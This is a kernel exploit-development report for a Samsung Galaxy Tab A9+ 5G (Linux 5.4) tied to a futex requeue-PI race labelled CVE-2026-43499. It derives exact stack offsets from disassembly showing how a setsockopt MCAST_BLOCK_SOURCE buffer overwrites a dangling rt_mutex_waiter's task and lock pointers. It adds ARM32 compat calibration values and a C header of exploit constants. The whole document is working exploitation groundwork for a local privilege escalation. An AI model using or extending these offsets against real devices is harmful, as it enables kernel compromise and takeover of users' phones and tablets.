# SM-X216B (Linux 5.4.249) MCAST & Stack Geometry Verification Report

**Target Device:** Samsung Galaxy Tab A9+ 5G (`SM-X216B` / `gta9p`)  
**Firmware:** `X216BXXS9DYJ7`  
**Kernel:** `5.4.249-qgki-31053672-abX216BXXS9DYJ7` (Qualcomm SM6375, AArch64 Little-Endian)  
**Binary Analyzed:** `/root/s/vmlinux.elf`  

---

## 1. Executive Summary

In CVE-2026-43499 (GhostLock / Futex Requeue PI Race), a dangling `rt_mutex_waiter` pointer is left on the stack of the racing waiter thread. To gain code execution or pivot into fake lock structures without tearing the kernel stack, an attacker re-enters the kernel using an in-thread copy syscall to overwrite ("stamp") the stale waiter structure on the stack.

This report documents the **exact mathematical stack geometry** extracted directly from disassembled functions in `vmlinux.elf` for both:
1. **64-bit Native MCAST Stamping** (`setsockopt` with `MCAST_BLOCK_SOURCE` / `MCAST_JOIN_SOURCE_GROUP`, optnames `42..47`).
2. **ARM32 Compat Stamping (`exp32`)** (`compat_mc_setsockopt`).
3. **Comparison against the Futex Waiter Position** in `do_futex()`.

---

## 2. Target `rt_mutex_waiter` Structure Layout (Linux 5.4)

Unlike Linux 5.15+ (which introduced an 88-byte compact waiter with `wake_state` at `+0x40` and `ww_ctx` at `+0x50`), the SM-X216B Linux 5.4 kernel uses an **80-byte (`0x50`)** waiter layout:

| QWORD (Word Index) | Byte Offset | Struct Member | Size | Function in Exploit |
| :---: | :---: | :--- | :--- | :--- |
| **Word 0** | `+0x00` | `tree_entry.__rb_parent_color` | 8 bytes | RB-Tree parent / color |
| **Word 1** | `+0x08` | `tree_entry.rb_right` | 8 bytes | RB-Tree right child |
| **Word 2** | `+0x10` | `tree_entry.rb_left` | 8 bytes | RB-Tree left child |
| **Word 3** | `+0x18` | `pi_tree_entry.__rb_parent_color` | 8 bytes | PI RB-Tree parent / color |
| **Word 4** | `+0x20` | `pi_tree_entry.rb_right` | 8 bytes | PI RB-Tree right child |
| **Word 5** | `+0x28` | `pi_tree_entry.rb_left` | 8 bytes | PI RB-Tree left child |
| **Word 6** | **`+0x30`** | **`task`** (`struct task_struct *`) | 8 bytes | Owner / Target Task pointer |
| **Word 7** | **`+0x38`** | **`lock`** (`struct rt_mutex *`) | 8 bytes | Redirected Fake Lock pointer |
| **Word 8** | `+0x40` | `prio` + padding | 8 bytes | Waiter priority |
| **Word 9** | `+0x48` | `deadline` | 8 bytes | Waiter deadline |

> **Crucial Observation:** `rt_mutex_adjust_prio_chain()` only dereferences `waiter->task` (Word 6) and `waiter->lock` (Word 7). Thus, all active redirection words strictly satisfy **`waiter_word <= 7`**.

---

## 3. Reference Frame 1: The Dangling Waiter in `do_futex()`

When Thread A calls `futex(FUTEX_WAIT_REQUEUE_PI)`:

1. **Syscall Entry (`el0_svc`):**  
   - Base stack pointer: `SP_sys`
2. **`el0_svc_handler` (`0xffffffc0102dd1f8`):**  
   - Frame allocation: `stp x29, x30, [sp, #-16]!`  
   - Current SP: `SP_sys - 0x10`
3. **`el0_svc_common` (`0xffffffc0102dd26c`):**  
   - Frame allocation: `stp x29, x30, [sp, #-64]!`  
   - Current SP: `SP_sys - 0x50`
4. **`__arm64_sys_futex` (`0xffffffc0103c3498`):**  
   - Frame allocation: `sub sp, sp, #0x70`  
   - Current SP: `SP_sys - 0xc0`
5. **`do_futex` (`0xffffffc0103c02dc`):**  
   - Frame allocation: `stp x29, x30, [sp, #-96]!`  
   - Saves frame pointer: `x29 = SP_sys - 0xc0 - 0x60 = SP_sys - 0x120`  
   - Local buffer allocation: `sub sp, sp, #0x1b0`
6. **Waiter Placement in `do_futex`:**  
   - Instructions: `sub x28, x29, #0xc8` / `sub x0, x29, #0xc8`  
   - `waiter_base = x29 - 0xc8 = (SP_sys - 0x120) - 0xc8 = SP_sys - 0x1e8`  
   - `waiter_end  = waiter_base + 0x50 (80 bytes) = SP_sys - 0x198`

### Futex Coordinates:
```
Waiter Start: SP_sys - 0x1e8
Waiter End:   SP_sys - 0x198
waiter->task: SP_sys - 0x1e8 + 0x30 = SP_sys - 0x1b8
waiter->lock: SP_sys - 0x1e8 + 0x38 = SP_sys - 0x1b0
```

---

## 4. Reference Frame 2: 64-bit Native MCAST (`MCAST_BLOCK_SOURCE`)

When Thread A stamps using 64-bit `setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, &gsr, 264)`:

1. **`el0_svc` -> `el0_svc_handler`:**  
   - Current SP: `SP_sys - 0x10`
2. **`el0_svc_common`:**  
   - Current SP: `SP_sys - 0x50`
3. **`__arm64_sys_setsockopt` (`0xffffffc0112ebbd0`):**  
   - Frame allocation: `stp x29, x30, [sp, #-16]!`  
   - Current SP: `SP_sys - 0x60`
4. **`__sys_setsockopt` (`0xffffffc0112f2f74`):**  
   - Frame allocation: `sub sp, sp, #0x70`  
   - Current SP: `SP_sys - 0xd0`
5. **`sock_common_setsockopt` (`0xffffffc0112f95d0`):**  
   - Frame allocation: `sub sp, sp, #0x40`  
   - Current SP: `SP_sys - 0x110`
6. **`ip_setsockopt` (`0xffffffc0113b5cf4`):**  
   - Frame allocation: `stp x29, x30, [sp, #-48]!`  
   - Current SP: `SP_sys - 0x140`
7. **`do_ip_setsockopt` (`0xffffffc0113b5d88`):**  
   - Frame allocation: `sub sp, sp, #0x190`  
   - Current SP: `SP_sys - 0x140 - 0x190 = SP_sys - 0x2d0`  
   - Stack Buffer Location: `add x0, sp, #0x20`  
   - `copy_from_user(sp + 0x20, user_optval, 0x108)` (264 bytes)  
   - `buffer_start = (SP_sys - 0x2d0) + 0x20 = SP_sys - 0x2b0`  
   - `buffer_end   = buffer_start + 0x108 = SP_sys - 0x1a8`

---

## 5. Exact Mathematical Overlap: Futex vs. 64-bit MCAST

Comparing the two stack layouts relative to `SP_sys`:

```
Low Memory                                                               High Memory
[--------------- do_ip_setsockopt Stack Frame (SP_sys - 0x2d0) -------------------]
                  |<- Buffer Start (SP_sys - 0x2b0)
                  |
                  | [200 bytes padding / gsr header]
                  |
                  |                          |<- Waiter Start (SP_sys - 0x1e8)
                  |                          |   task (+0x30) -> SP_sys - 0x1b8
                  |                          |   lock (+0x38) -> SP_sys - 0x1b0
                  |                          |
                  |--------------------------|<- Buffer End   (SP_sys - 0x1a8)
                                             |   (264 bytes / 0x108 total)
                                             |
                                             |<- Waiter End   (SP_sys - 0x198)
```

### Precise Offset Calculation:
$$\text{Offset of Waiter Base inside Buffer} = (\text{SP}_{sys} - 0x1e8) - (\text{SP}_{sys} - 0x2b0) = 0x2b0 - 0x1e8 = 0xc8 \text{ bytes (200 bytes)}$$

From `buffer_start`:
- **`waiter->tree_entry`** lands at buffer offset `0xc8` (200)
- **`waiter->pi_tree_entry`** lands at buffer offset `0xe0` (224)
- **`waiter->task`** lands at buffer offset `0xc8 + 0x30 = 0xf8` (248)
- **`waiter->lock`** lands at buffer offset `0xc8 + 0x38 = 0x100` (256)
- **Buffer ends at:** `0x108` (264)

### Geometric Result:
1. `waiter->task` (at `0xf8`) is completely within the 264-byte buffer `[0x00..0x108]`.
2. `waiter->lock` (at `0x100`..`0x108`) ends **exactly at the last byte of the 264-byte buffer**!
3. The remaining tail (`prio` and `deadline`) sits slightly beyond `0x108`, but because `rt_mutex_adjust_prio_chain()` only validates `waiter->lock` and follows `waiter->task`, the essential redirection words (`waiter_word <= 7`) land inside the stamped region.

---

## 6. ARM32 Compat Mode Geometry (`compat_mc_setsockopt` / `exp32`)

When using a 32-bit compat thread:
- Syscall path passes through `compat_mc_setsockopt` (`0xffffffc01136292c`), which allocates a temporary 264-byte staging buffer on the user stack via `compat_alloc_user_space(0x108)`.
- It converts the 260-byte 32-bit user struct (`0x104`) into the 264-byte 64-bit struct (`0x108`) by expanding `gsr_interface` alignment from 4 to 8 bytes.
- It then calls `do_ip_setsockopt()` or `do_ipv6_setsockopt()`.
- Due to the extra intermediate compat stack frames (`compat_sock_common_setsockopt`, `compat_ip_setsockopt`, `compat_mc_setsockopt`), the overall stack depth increases by `0x100` bytes, shifting the base stamp offset.
- For SM-X216B Linux 5.4, the required `EXP32_STAMP_OFF` compensation window is **`0x60` to `0x70`** (calibrated via `calibrate.sh`).

---

## 7. Structure Offset Matrix for SM-X216B Header Files

```c
/* =========================================================================
 * SM-X216B (Linux 5.4.249) MCAST & RT-MUTEX GEOMETRY DEFINITIONS
 * ========================================================================= */

#define MCAST_BLOCK_SOURCE         43
#define MCAST_JOIN_SOURCE_GROUP    46

/* Buffer sizes */
#define MCAST_BUFFER_SIZE_64       264   /* 0x108 bytes */
#define MCAST_BUFFER_SIZE_32       260   /* 0x104 bytes */

/* Waiter Structure Constants */
#define RT_MUTEX_WAITER_SIZE       80    /* 0x50 bytes */
#define FAKE_WAITER_TASK_OFF       0x30  /* Word 6 */
#define FAKE_WAITER_LOCK_OFF       0x38  /* Word 7 */
#define FAKE_WAITER_PRIO_OFF       0x40  /* Word 8 */
#define FAKE_WAITER_DEADLINE_OFF   0x48  /* Word 9 */

/* 64-bit Direct MCAST Overlap Offsets */
#define MCAST_64_WAITER_BASE_OFF   0xc8  /* 200 bytes */
#define MCAST_64_TASK_OFF          0xf8  /* 248 bytes */
#define MCAST_64_LOCK_OFF          0x100 /* 256 bytes */

/* 32-bit Compat Calibration */
#define EXP32_STAMP_OFF_DEFAULT    0x68
```
